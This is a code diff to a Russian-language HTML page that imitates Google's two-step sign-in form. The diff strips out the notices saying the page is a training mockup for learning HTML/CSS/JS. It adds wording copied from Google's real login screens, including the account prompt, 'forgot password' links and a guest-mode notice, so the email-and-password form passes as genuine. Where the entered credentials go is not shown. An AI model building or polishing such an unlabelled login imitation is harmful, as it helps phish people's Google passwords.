@@ -146,30 +146,31 @@ alt="Google Logo">
 <!-- EMAIL STEP -->
 <div id="email-step">
     <h1>Вход</h1>
-    <p class="subtitle">Учебный макет</p>
+    <p class="subtitle">Используйте аккаунт Google</p>
 
     <div class="input-group">
-        <input type="email" id="email" placeholder="Email" required>
-        <a class="forgot-link" href="#">Забыли email?</a>
+        <input type="email" id="email" placeholder="Телефон или адрес эл. почты" required>
     </div>
 
-    <p class="info-text">
-        Это демонстрационная страница для обучения HTML/CSS/JS.
-    </p>
+    <a class="forgot-link" href="#">Забыли адрес электронной почты?</a>
 
     <div class="buttons">
         <a class="create-account" href="#">Создать аккаунт</a>
         <button class="btn-next" onclick="nextStep()">Далее</button>
     </div>
+
+    <p class="info-text">
+        Работаете на чужом компьютере? Используйте режим "Частный доступ". <a href="#">Подробнее об использовании гостевого режима</a>
+    </p>
 </div>
 
 <!-- PASSWORD STEP -->
 <div id="password-step">
-    <h1>Добро пожаловать</h1>
+    <h1>Добро пожаловать!</h1>
     <div class="user-email" id="userEmail"></div>
 
     <div class="input-group">
-        <input type="password" id="password" placeholder="Пароль">
+        <input type="password" id="password" placeholder="Введите пароль">
         <div style="margin-top:10px;">
             <input type="checkbox" id="showPass">
             <label class="checkbox-label" for="showPass">Показать пароль</label>
@@ -177,8 +178,10 @@ alt="Google Logo">
     </div>
 
     <div class="buttons" style="justify-content:flex-end;">
-        <button class="btn-next" onclick="finish()">Готово</button>
+        <button class="btn-next" onclick="finish()">Далее</button>
     </div>
+
+    <a class="forgot-link" href="#">Забыли пароль?</a>
 </div>
 
 </div>
